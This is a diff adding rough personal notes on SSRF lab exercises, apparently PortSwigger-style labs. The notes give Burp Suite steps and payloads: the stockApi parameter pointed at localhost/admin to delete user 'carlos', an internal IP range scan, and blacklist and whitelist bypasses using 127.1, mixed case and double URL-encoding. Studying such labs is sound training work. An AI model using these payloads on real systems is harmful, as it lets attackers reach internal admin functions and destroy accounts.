@@ -1,0 +1,133 @@
+SSRF against the local server
+
+
+
+1)   Basic..............................
+
+Accessing Private (Admin) Resources Using an SSRF Vulnerability
+
+
+
+http://localhost/admin     >>>>>delete carlos id
+
+
+click stocks     >>>           intercept o             >>  visible admin panel see
+
+
+intercept off    >>>         click admin panel         >>  visible loopback notification
+
+
+
+turn on  intercept    >> click on check stock         >>  http%3A ctrl+k add http://localhost/
+
+
+click stock checker  >>  http://localhost/admin    == ctrl+u    >> users all visible
+
+
+
+carlos delete option copy     and click check >>>>  https://localhost/admin/delete?username=carlos  +  ctrl +u
+
+
+could not fetch stock levels!  ???????????????? notice  ???????????
+
+
+http://localhost/admin  + ctrl +u send    success ful delete carlos userid 
+
+
+
+....................................................................
+
+
+2)  Advanced SSRF Discovery
+
+decoder
+
+1)  example ==   stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
+
+                                         |||||
+
+                                        ^^^^^^^
+
+stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId%3D1
+
+
+2)  push to repeater  and clear 192.168.47.130  ctrl+k  ----       snd    >>> missing parameter   visible
+
+3)  modifi ip addresh   1 into 2 last path  >> snd
+
+4)  re modi normal ip     >>> snd into intruder >>>   add  §    1   §   ex:   stockApi=http%3a//192.168.0.§1§%3a8080/
+
+5)  ------------
+
+-----------------------------------------------------------------------------------------------
+
+           outp[ut comes successfuly
+
+
+Bypassing Blacklists:
+
+repeater end codes
+
+http://localhost/admin          into convert http://lOcAlhost/
+
+secondery panel show rander was admin panel
+
+http://127.1/
+
+http://localhost/       int url >>> url encode character       in towel time  >> successful comes outcomes
+
+
+nxt intersept  >> change code  on delete user 1 copy path     >> paste and  + towel time code also paste...
+----------------------------------------------------------------------------------------------------------------------------
+normal intersept on capture code right side >>> send on repeater 
+
+to delete overall code outcome   >> https://localhost/    >> puton this code
+
+>>out come example>> be stock.weliketoshop.net/
+
+
+http://loclhost#@stock.weliketoshop.net/
+
+#     >>> into # + url + url character code 2 timesss>>>>
+
+
+
+stockApi=      http://localhost%25%32%33@stock.weliketoshop.net/
+
+
+
+http://localhost%25%32%33@stock.weliketoshop.net/                       -------------solved
+
+-------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
